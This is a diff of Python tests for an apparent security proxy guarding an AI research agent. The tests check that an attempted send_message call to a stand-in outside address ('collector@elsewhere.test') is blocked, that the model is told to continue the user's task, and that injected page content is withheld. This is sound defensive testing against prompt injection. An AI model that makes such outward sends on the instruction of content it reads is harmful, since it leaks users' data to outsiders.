@@ -342,7 +342,10 @@ def test_unmodified_openai_sdk_agent_through_proxy_one_setting(env):
     with make_client(env, router, judge=0.95) as c:
         client = OpenAI(base_url="http://testserver/proxy/research-agent/v1", api_key=PROJECT, http_client=c)
         answer = plain_agent.run("Summarise https://fixtures.test/a.html", box, client=client)
-        assert "blocked by the security policy" in answer   # PRX-3: the blocked call became a safe notice
+        # D-062: the blocked call never reached the agent; the model was told (as the call's result) and continued.
+        assert answer == "Here is the summary."
+        told = [m for m in router.requests[2].messages if m.get("role") == "tool" and "call_send" in m.get("tool_call_id", "")]
+        assert told and "Continue the user's task" in told[0]["content"]
         assert box.outbox == []                                          # the external send never reached the tool
         assert all("ZQX-MARKER" not in json.dumps(r.messages) for r in router.requests[1:])   # page withheld upstream
         decisions = c.get("/v1/decisions?agent=research-agent", headers=H(PUBLIC)).json()
@@ -666,3 +669,18 @@ def test_investigator_falls_back_to_a_report_from_the_log(env):
         assert inv["status"] == "fallback" and inv["report"]["verdict"] == "likely_attack"
         assert any(s["step"] == "error" for s in inv["steps"])
         assert c.post("/v1/sessions/nope/investigate", headers=H(ADMIN)).status_code == 404
+
+
+def test_stream_continues_after_a_stopped_call(env):
+    """D-062 (streaming): every call in the turn was stopped, so the model is told and its next answer is streamed;
+    the stopped call is never released to the agent."""
+    router = ScriptedRouter([("I could not send it outside the company; here is the summary instead.", [])])
+    router.tool_calls = [tc("send_message", {"to": "collector@elsewhere.test", "subject": "notes", "body": "x"})]
+    with make_client(env, router) as c:
+        r = c.post("/proxy/research-agent/v1/chat/completions", headers=H(PROJECT),
+                   json={"stream": True, "messages": [{"role": "user", "content": "Summarise the notes"}]})
+        chunks = [json.loads(line[6:]) for line in r.text.splitlines() if line.startswith("data: {")]
+        text = "".join((ch["choices"][0]["delta"].get("content") or "") for ch in chunks if ch.get("choices"))
+        assert "here is the summary instead" in text
+        assert not any(ch["choices"][0]["delta"].get("tool_calls") for ch in chunks if ch.get("choices"))
+        assert chunks[-1]["x_security"]["blocked_tool_calls"] == 1
